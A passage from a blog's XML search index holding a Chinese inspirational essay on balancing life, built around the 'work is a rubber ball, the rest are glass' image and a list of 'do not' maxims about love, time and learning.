你明白工作是一个橡胶球。既使你没有接住它，它也会反弹回来。但是其他四个都是用玻璃制成的。<br><br>   如果你掉落其中一个，它将会无法挽回地留下划痕和缺口，甚或是摔得粉碎。</p><p>   它们永远都不会恢复到原来的样子了。</p><p>   你必须努力学会权衡生活。怎样去做呢？</p><p>　　不要因为和他人比较而使自己的价值逐渐削弱，因为我们每个人都是与众不同的。</p><p>　　不要把目标定在别人所认为重要的事情上。因为只有你才知道什么最适合自己。</p><p>　　不要把什么事情都看作心中最紧要的。并依靠它们去活命，因为它们有时候毫无意<br>义。</p><p>　　不要在你尚可给予的时候放弃.因为没有任何事情会在你尝试之前失败。</p><p>　　不要担心承认你不够完美。因为正是这根脆弱的细线将我们联结在一起。</p><p>　　不要畏惧遭遇冒险。因为这正是使我们学会勇敢的机会。</p><p>　　不要说不可能找到爱就把爱关在生活的门外，因为最快得到爱的方式就是付出爱，<br>最快失去爱的方式就是把爱抓得太紧，而保持爱的最好方式是让它插上翅膀。</p><p>　　不要忘记，一个人最大的情感需求是得到欣赏（赏识）。</p><p>　　不要害怕去学习。因为知识是没有重量，并且总是能够轻易随身携带的财富。</p><p>　　不要轻率地使用时间或者言辞。因为两者都不可能被收回。</p><p>　　不要因生活在过去或者将来而让生命从你的指尖滑过。一天接一天踏实地去生活，<br>那你生活的每一天都是自己的生活。</p><p>　　不要过怏地穿越生活而忘记了你身在何处，将向何方。</p><p>　　生活不是跑步比赛，而是沿途每一步都值得慢慢欣赏的旅行。昨天已是历史，明天<br>还是一个谜，而今天则是一份礼物。因此我们称它为“present”。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
